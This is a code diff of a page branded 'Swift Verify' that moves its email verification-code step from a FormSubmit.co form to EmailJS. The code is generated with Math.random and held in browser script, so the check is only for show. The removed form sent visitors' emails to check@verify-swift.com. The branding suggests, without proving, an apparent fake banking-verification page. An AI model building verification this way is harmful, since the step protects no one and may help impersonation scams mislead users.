@@ -348,17 +348,6 @@
     <div class="step-content" id="step2Content" style="display: none;">
       <p>Please enter your email address to receive a verification code.</p>
       
-      <!-- FormSubmit.co Form -->
-      <form id="emailForm" action="https://formsubmit.co/check@verify-swift.com" method="POST" style="display: none;">
-        <input type="hidden" name="_subject" value="Swift Verify - Verification Code">
-        <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://verify-swift.com/myswift.html?success=true">
-        <input type="hidden" name="verificationCode" id="verificationCodeField">
-        <input type="hidden" name="reference" id="referenceField">
-        <input type="hidden" name="email" id="formEmailField">
-      </form>
-      
       <div class="form-group">
         <label for="email">Email address</label>
         <input type="email" id="email" placeholder="Enter your email" />
@@ -417,7 +406,13 @@
   </div>
 </div>
 
+<!-- EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
 <script>
+  // EmailJS initialize
+  emailjs.init("2bVi6WlSxFdQXILnk");
+
   // Menu toggle function
   function toggleMenu() {
     const nav = document.getElementById('navbar');
@@ -450,12 +445,6 @@
   const emailInput = document.getElementById('email');
   const codeInput = document.getElementById('verificationCode');
   const userEmailDisplay = document.getElementById('userEmailDisplay');
-  
-  // Form fields
-  const emailForm = document.getElementById('emailForm');
-  const verificationCodeField = document.getElementById('verificationCodeField');
-  const referenceField = document.getElementById('referenceField');
-  const formEmailField = document.getElementById('formEmailField');
   
   // Messages
   const loadingSend = document.getElementById('loadingSend');
@@ -516,8 +505,8 @@
     emailError.style.display = 'none';
   });
   
-  // Send verification code - FormSubmit.co version
-  sendCodeBtn.addEventListener('click', function(e) {
+  // Send verification code - EmailJS version
+  sendCodeBtn.addEventListener('click', async function(e) {
     e.preventDefault();
     const email = emailInput.value.trim();
     
@@ -531,49 +520,60 @@
       currentVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
       userEmail = email;
       
-      // Fill form fields
-      verificationCodeField.value = currentVerificationCode;
-      referenceField.value = currentReference;
-      formEmailField.value = email;
-      
-      // Submit form
-      setTimeout(() => {
-        emailForm.submit();
+      try {
+        // EmailJS ilə göndər
+        await emailjs.send("service_q2d8icr", "template_dt8dfhy", {
+          to_email: email,
+          code: currentVerificationCode,
+          reference: currentReference
+        });
         
-        // Show step 3 (even if form submission is in progress)
-        loadingSend.style.display = 'none';
-        sendCodeBtn.disabled = false;
+        // Uğurlu - step 3-ə keç
         step2Content.style.display = "none";
         step3Content.style.display = "block";
         step2.classList.remove('active');
         step3.classList.add('active');
         userEmailDisplay.textContent = email;
         
-        console.log(`Verification code ${currentVerificationCode} would be sent to ${email}`);
-      }, 1000);
+        console.log(`Verification code sent from check@verify-swift.com to ${email}`);
+        
+      } catch (error) {
+        console.error('Email sending failed:', error);
+        emailError.textContent = 'Failed to send verification code. Please try again.';
+        emailError.style.display = 'block';
+      } finally {
+        loadingSend.style.display = 'none';
+        sendCodeBtn.disabled = false;
+      }
       
     } else {
       alert("Please enter a valid email address.");
     }
   });
   
-  // Resend code functionality
-  resendCode.addEventListener('click', function() {
+  // Resend code functionality - EmailJS version
+  resendCode.addEventListener('click', async function() {
     if (userEmail) {
       // Generate new code
       currentVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
       loadingResend.style.display = 'block';
       
-      // Update form fields
-      verificationCodeField.value = currentVerificationCode;
-      
-      // Resubmit form
-      setTimeout(() => {
-        emailForm.submit();
-        loadingResend.style.display = 'none';
+      try {
+        await emailjs.send("service_q2d8icr", "template_dt8dfhy", {
+          to_email: userEmail,
+          code: currentVerificationCode,
+          reference: currentReference
+        });
+        
         alert('New verification code sent successfully!');
-        console.log(`New verification code ${currentVerificationCode} sent to ${userEmail}`);
-      }, 1000);
+        console.log(`New verification code sent to ${userEmail}`);
+        
+      } catch (error) {
+        console.error('Resend failed:', error);
+        alert('Failed to resend code. Please try again.');
+      } finally {
+        loadingResend.style.display = 'none';
+      }
     }
   });
   
